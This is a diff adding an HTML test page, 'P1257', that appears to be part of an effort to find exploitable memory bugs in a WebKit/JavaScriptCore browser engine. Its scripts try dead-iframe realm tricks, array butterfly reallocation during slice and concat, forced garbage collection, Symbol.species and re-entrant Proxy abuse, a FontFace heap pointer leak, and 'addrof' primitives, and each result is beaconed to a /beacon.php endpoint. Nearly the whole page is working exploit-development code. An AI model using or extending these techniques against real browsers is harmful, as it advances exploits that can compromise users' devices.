@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>P1257</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#111;color:#0f0;font:11px/1.4 monospace;padding:8px;overflow-y:auto}
+#log{white-space:pre-wrap;word-break:break-all}
+</style>
+</head>
+<body>
+<div id="log"></div>
+
+<script>
+var L=document.getElementById('log');
+function log(s){L.textContent+=s+'\n';}
+function B(tag,data){
+  try{
+    var u='/beacon.php?tag=P1257-'+encodeURIComponent(tag);
+    if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+    u+='&t='+Date.now();
+    var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);
+  }catch(e){}
+}
+log('=== P1257: BUTTERFLY FIXED + FONTFACE LEAK ===');
+B('START','P1257');
+
+// CORRECT dead-realm eval pattern:
+// var fn = f.win.eval('(function(param){...})');  // Create function in iframe
+// fn(mainFrameValue);  // Call from main frame with main-frame vars
+// document.body.removeChild(f.ifr);  // Then kill realm
+
+function mkFrame(){
+  var ifr=document.createElement('iframe');
+  ifr.style.cssText='width:1px;height:1px;position:absolute;left:-9999px';
+  document.body.appendChild(ifr);
+  ifr.contentDocument.open();
+  ifr.contentDocument.write('<html><body></body></html>');
+  ifr.contentDocument.close();
+  return {win:ifr.contentWindow, doc:ifr.contentDocument, ifr:ifr};
+}
+</script>
+
+<!-- A: Butterfly realloc via getter (FIXED eval) -->
+<script>
+log('\n--- A: Butterfly realloc during slice (fixed) ---');
+(function(){
+  var arr=new Array(8);
+  for(var i=0;i<8;i++) arr[i]=i+0.1;
+
+  var f=mkFrame();
+  // TWO-STEP: create function, then call with main-frame arg
+  var installGetter=f.win.eval('(function(arr){'+
+    'var triggered=false;'+
+    'Object.defineProperty(arr, "3", {'+
+      'get:function(){'+
+        'if(!triggered){'+
+          'triggered=true;'+
+          'for(var i=0;i<100;i++) arr["p"+i]=i;'+
+          'for(var i=8;i<200;i++) arr[i]=i+0.5;'+
+        '}'+
+        'return 3.1;'+
+      '},'+
+      'configurable:true'+
+    '});'+
+  '})');
+  installGetter(arr);  // Call with main-frame arr
+  document.body.removeChild(f.ifr);
+
+  try{
+    var sliced=arr.slice(0);
+    B('A1','slice_len='+sliced.length+'|orig_len='+arr.length+
+      '|v0='+sliced[0]+'|v3='+sliced[3]+'|v7='+sliced[7]+
+      '|v50='+(sliced[50]!==undefined?sliced[50]:'undef'));
+  }catch(e){B('A1','err:'+e.name+':'+e.message.slice(0,60));}
+
+  // Test 2: nuke array during concat
+  arr=new Array(8);
+  for(var i=0;i<8;i++) arr[i]=i+0.1;
+  var f2=mkFrame();
+  var installGetter2=f2.win.eval('(function(arr){'+
+    'var triggered=false;'+
+    'Object.defineProperty(arr, "2", {'+
+      'get:function(){'+
+        'if(!triggered){'+
+          'triggered=true;'+
+          'arr.length=0;'+
+          'arr.length=8;'+
+        '}'+
+        'return 2.1;'+
+      '},'+
+      'configurable:true'+
+    '});'+
+  '})');
+  installGetter2(arr);
+  document.body.removeChild(f2.ifr);
+
+  try{
+    var concated=arr.concat([99]);
+    B('A2','concat_len='+concated.length+'|v0='+concated[0]+
+      '|v2='+concated[2]+'|v7='+concated[7]+'|v8='+concated[8]);
+  }catch(e){B('A2','err:'+e.name+':'+e.message.slice(0,60));}
+})();
+</script>
+
+<!-- B: GC during iteration (FIXED eval) -->
+<script>
+log('\n--- B: GC during slice/map ---');
+(function(){
+  var arr=new Array(16);
+  for(var i=0;i<16;i++) arr[i]=i+0.1;
+
+  var f=mkFrame();
+  var installGetter=f.win.eval('(function(arr){'+
+    'var triggered=false;'+
+    'Object.defineProperty(arr, "4", {'+
+      'get:function(){'+
+        'if(!triggered){'+
+          'triggered=true;'+
+          'for(var g=0;g<5;g++){'+
+            'var garbage=[];'+
+            'for(var j=0;j<3000;j++) garbage.push(new ArrayBuffer(1024));'+
+          '}'+
+        '}'+
+        'return 4.1;'+
+      '},'+
+      'configurable:true'+
+    '});'+
+  '})');
+  installGetter(arr);
+  document.body.removeChild(f.ifr);
+
+  try{
+    var sliced=arr.slice(0);
+    B('B1','slice_len='+sliced.length+
+      '|v0='+sliced[0]+'|v4='+sliced[4]+'|v15='+sliced[15]);
+  }catch(e){B('B1','err:'+e.name+':'+e.message.slice(0,60));}
+})();
+</script>
+
+<!-- C: Species with Proxy result — test if JSC actually calls species -->
+<script>
+log('\n--- C: Species diagnostic ---');
+(function(){
+  // First: does species actually get called?
+  var speciesCalled=false;
+  var speciesLen=-1;
+  var arr=[1,2,3,4,5];
+  arr.constructor={};
+  arr.constructor[Symbol.species]=function TestSpecies(len){
+    speciesCalled=true;
+    speciesLen=len;
+    return new Array(len);  // Return regular array to let map proceed normally
+  };
+
+  try{
+    var result=arr.map(function(x){return x*2;});
+    B('C1','called='+speciesCalled+'|len='+speciesLen+
+      '|result_len='+result.length+'|isArr='+Array.isArray(result));
+  }catch(e){B('C1','err:'+e.name+':'+e.message.slice(0,60));}
+
+  // Now try with species returning an object (not array, not TA)
+  var setCount=0;
+  arr=[10,20,30];
+  arr.constructor={};
+  arr.constructor[Symbol.species]=function(len){
+    var obj={length:0};
+    // Plain object with numeric-indexed storage
+    return obj;
+  };
+
+  try{
+    var result2=arr.map(function(x){return x+1;});
+    var type=typeof result2;
+    var isArr=Array.isArray(result2);
+    B('C2','type='+type+'|isArr='+isArr+'|len='+result2.length+
+      '|v0='+result2[0]+'|v1='+result2[1]+'|v2='+result2[2]);
+  }catch(e){B('C2','err:'+e.name+':'+e.message.slice(0,60));}
+
+  // Species returning object with setter traps via defineProperty
+  arr=[100,200,300,400,500];
+  var writeLog=[];
+  arr.constructor={};
+  arr.constructor[Symbol.species]=function(len){
+    var obj={};
+    for(var i=0;i<len;i++){
+      (function(idx){
+        Object.defineProperty(obj, String(idx), {
+          set:function(v){ writeLog.push(idx+'='+v); },
+          get:function(){ return undefined; },
+          configurable:true, enumerable:true
+        });
+      })(i);
+    }
+    obj.length=len;
+    return obj;
+  };
+
+  try{
+    var result3=arr.map(function(x){return x*3;});
+    B('C3','writes='+writeLog.length+'|log='+writeLog.join(';')+
+      '|len='+result3.length);
+  }catch(e){B('C3','err:'+e.name+':'+e.message.slice(0,60));}
+})();
+</script>
+
+<!-- D: Re-entrant indexOf/reduce with closure Proxy (FIXED) -->
+<script>
+log('\n--- D: Re-entrant array methods (fixed) ---');
+(function(){
+  var backing=[10,20,30,40,50,60,70,80,90,100];
+
+  var f=mkFrame();
+  var makeHandler=f.win.eval('(function(backing){'+
+    'return {'+
+      'get:function(t,p){'+
+        'if(p==="length") return backing.length;'+
+        'var idx=parseInt(p);'+
+        'if(!isNaN(idx)){'+
+          'if(idx===5) backing.length=3;'+
+          'return backing[idx];'+
+        '}'+
+        'return backing[p];'+
+      '}'+
+    '};'+
+  '})');
+  var handler=makeHandler(backing);
+  document.body.removeChild(f.ifr);
+
+  var proxy=new Proxy([], handler);
+
+  try{
+    var idx=Array.prototype.indexOf.call(proxy, 70);
+    B('D1','indexOf='+idx+'|backing_len='+backing.length);
+  }catch(e){B('D1','err:'+e.name+':'+e.message.slice(0,60));}
+
+  // reduce with shrinking backing
+  backing=[1,2,3,4,5,6,7,8,9,10];
+  var f2=mkFrame();
+  var makeHandler2=f2.win.eval('(function(backing){'+
+    'return {'+
+      'get:function(t,p){'+
+        'if(p==="length") return backing.length;'+
+        'var idx=parseInt(p);'+
+        'if(!isNaN(idx)){'+
+          'if(idx===5) backing.length=3;'+
+          'return backing[idx];'+
+        '}'+
+        'return backing[p];'+
+      '}'+
+    '};'+
+  '})');
+  var handler2=makeHandler2(backing);
+  document.body.removeChild(f2.ifr);
+
+  var proxy2=new Proxy([], handler2);
+  try{
+    var sum=Array.prototype.reduce.call(proxy2, function(acc,v){return acc+(v||0);}, 0);
+    B('D2','reduce='+sum+'|expected=55|backing_len='+backing.length);
+  }catch(e){B('D2','err:'+e.name+':'+e.message.slice(0,60));}
+
+  // copyWithin with re-entrant shrink
+  backing=[0,1,2,3,4,5,6,7,8,9];
+  var f3=mkFrame();
+  var makeHandler3=f3.win.eval('(function(backing){'+
+    'return {'+
+      'get:function(t,p){'+
+        'if(p==="length") return backing.length;'+
+        'var idx=parseInt(p);'+
+        'if(!isNaN(idx)){'+
+          'if(idx===7) backing.splice(0,3);'+  // Remove first 3 during read
+          'return backing[idx];'+
+        '}'+
+        'return backing[p];'+
+      '},'+
+      'set:function(t,p,v){ backing[p]=v; return true; },'+
+      'has:function(t,p){ return p in backing; }'+
+    '};'+
+  '})');
+  var handler3=makeHandler3(backing);
+  document.body.removeChild(f3.ifr);
+
+  var proxy3=new Proxy([], handler3);
+  try{
+    Array.prototype.copyWithin.call(proxy3, 0, 5);
+    B('D3','copyWithin|backing='+backing.join(',')+'|len='+backing.length);
+  }catch(e){B('D3','err:'+e.name+':'+e.message.slice(0,60));}
+})();
+</script>
+
+<!-- E: FontFace pointer disclosure (proper technique) -->
+<script>
+log('\n--- E: FontFace pointer disclosure ---');
+(function(){
+  try{
+    var fontData=new ArrayBuffer(256);
+    var fv=new Uint8Array(fontData);
+    fv[0]=0;fv[1]=1;fv[2]=0;fv[3]=0;
+    fv[4]=0;fv[5]=0;
+
+    var allPtrs=[];
+
+    for(var round=0;round<3;round++){
+      var bufs=[];
+      for(var i=0;i<20;i++){
+        var ab=new ArrayBuffer(192);
+        var v=new BigUint64Array(ab);
+        for(var j=0;j<v.length;j++) v[j]=0xDEADDEADDEADDEADn;
+        bufs.push({ab:ab,v:v});
+      }
+
+      try{
+        var ff=new FontFace('test'+round, fontData);
+        ff.load().catch(function(){});
+      }catch(e){}
+
+      for(var i=0;i<bufs.length;i++){
+        var v=bufs[i].v;
+        for(var j=0;j<v.length;j++){
+          var val=v[j];
+          if(val!==0xDEADDEADDEADDEADn && val!==0n){
+            allPtrs.push('r'+round+'b'+i+'['+j+']=0x'+val.toString(16));
+          }
+        }
+      }
+    }
+
+    B('E1','ptrs='+allPtrs.length+'|data='+allPtrs.slice(0,8).join(';'));
+
+    // Also try: check if FontFace modifies ITS OWN source buffer
+    var srcBuf=new ArrayBuffer(512);
+    var srcView=new BigUint64Array(srcBuf);
+    for(var i=0;i<srcView.length;i++) srcView[i]=0xCCCCCCCCCCCCCCCCn;
+    var srcU8=new Uint8Array(srcBuf);
+    srcU8[0]=0;srcU8[1]=1;srcU8[2]=0;srcU8[3]=0;
+    srcU8[4]=0;srcU8[5]=1; // 1 table
+
+    try{
+      var ff2=new FontFace('srctest', srcBuf);
+      ff2.load().catch(function(){});
+    }catch(e){}
+
+    // Check for modifications
+    var srcChanges=[];
+    for(var i=0;i<srcView.length;i++){
+      if(srcView[i]!==0xCCCCCCCCCCCCCCCCn){
+        srcChanges.push(i+':0x'+srcView[i].toString(16));
+      }
+    }
+    // First 8 bytes were our header, so exclude those
+    var realChanges=srcChanges.filter(function(s){return parseInt(s)>0;});
+    B('E2','src_changes='+realChanges.length+'|data='+realChanges.slice(0,5).join(';'));
+
+    // Try with URL source too
+    var ff3=new FontFace('urltest','url(data:font/woff2;base64,d09GMgABAAAA)');
+    try{ ff3.load().catch(function(){}); }catch(e){}
+    B('E3','ff3_status='+ff3.status);
+
+  }catch(e){B('E1','err:'+e.name+':'+e.message.slice(0,60));}
+})();
+</script>
+
+<!-- F: Array.from length caching (main-frame getter, no iframe needed) -->
+<script>
+log('\n--- F: Array.from + getter length mutation ---');
+(function(){
+  // Getter at index 3 that changes the arrayLike's length
+  var al={length:10};
+  for(var i=0;i<10;i++) al[i]=i+0.5;
+
+  Object.defineProperty(al, "3", {
+    get:function(){
+      al.length=100;
+      for(var i=10;i<50;i++) al[i]=i*3;
+      return 3.3;
+    },
+    configurable:true, enumerable:true
+  });
+
+  try{
+    var result=Array.from(al);
+    B('F1','from_len='+result.length+'|v0='+result[0]+
+      '|v3='+result[3]+'|v9='+result[9]+
+      '|v10='+(result[10]!==undefined?result[10]:'undef')+
+      '|v49='+(result[49]!==undefined?result[49]:'undef'));
+  }catch(e){B('F1','err:'+e.name+':'+e.message.slice(0,60));}
+
+  // Getter that shrinks during from
+  var al2={length:20};
+  for(var i=0;i<20;i++) al2[i]=i;
+  Object.defineProperty(al2, "5", {
+    get:function(){ al2.length=3; return 555; },
+    configurable:true, enumerable:true
+  });
+
+  try{
+    var result2=Array.from(al2);
+    B('F2','from_len='+result2.length+
+      '|v0='+result2[0]+'|v5='+result2[5]+
+      '|v10='+(result2[10]!==undefined?result2[10]:'undef')+
+      '|v19='+(result2[19]!==undefined?result2[19]:'undef'));
+  }catch(e){B('F2','err:'+e.name+':'+e.message.slice(0,60));}
+
+  // Getter that DELETES later properties
+  var al3={length:10};
+  for(var i=0;i<10;i++) al3[i]=i*10;
+  Object.defineProperty(al3, "2", {
+    get:function(){
+      delete al3[5]; delete al3[6]; delete al3[7];
+      return 222;
+    },
+    configurable:true, enumerable:true
+  });
+
+  try{
+    var result3=Array.from(al3);
+    B('F3','from_len='+result3.length+
+      '|v2='+result3[2]+'|v5='+result3[5]+'|v7='+result3[7]);
+  }catch(e){B('F3','err:'+e.name+':'+e.message.slice(0,60));}
+})();
+</script>
+
+<!-- G: addrof attempts -->
+<script>
+log('\n--- G: addrof attempts ---');
+(function(){
+  // Method 1: Float64Array view of object-holding buffer via structuredClone
+  var obj={marker:0xDEADBEEF};
+  var arr=[obj, null, obj, null];
+
+  // Can we observe the raw JSValue representation?
+  // Write objects into an array, then use BigUint64Array on same memory? No — JS arrays aren't TypedArrays.
+
+  // Method 2: WeakRef + FinalizationRegistry as oracle
+  // If we know an object's address range, we could use timing to confirm
+
+  // Method 3: Object as Map key — check if Map stores address
+  var map=new Map();
+  map.set(obj, 'target');
+
+  // Map internals aren't readable... but what about JSON.stringify with replacer?
+  // No — that serializes values, not addresses.
+
+  // Method 4: Check if any API leaks the internal JSCell pointer
+  // toString on various objects
+  var results=[];
+  results.push('obj:'+String(obj));
+  results.push('func:'+String(function(){}));
+  results.push('regex:'+String(/test/));
+  results.push('sym:'+String(Symbol('test')));
+  results.push('map:'+String(map));
+  results.push('set:'+String(new Set([obj])));
+  results.push('weakref:'+String(new WeakRef(obj)));
+  results.push('promise:'+String(Promise.resolve(obj)));
+  B('G1','tostring='+results.join('|'));
+
+  // Method 5: Error stack trace — does it leak any addresses?
+  try{
+    null.x;
+  }catch(e){
+    B('G2','stack='+String(e.stack).slice(0,200));
+  }
+
+  // Method 6: performance.now precision — can we measure address-dependent timing?
+  if(typeof performance!=='undefined'&&performance.now){
+    var t1=performance.now();
+    for(var i=0;i<10000;i++) obj.marker;
+    var t2=performance.now();
+    B('G3','perf_10k='+(t2-t1).toFixed(3)+'ms');
+  }else{
+    B('G3','no_performance_api');
+  }
+})();
+</script>
+
+<script>
+setTimeout(function(){
+  B('DONE','all');
+  log('\n=== P1257 COMPLETE ===');
+}, 6000);
+</script>
+
+</body>
+</html>
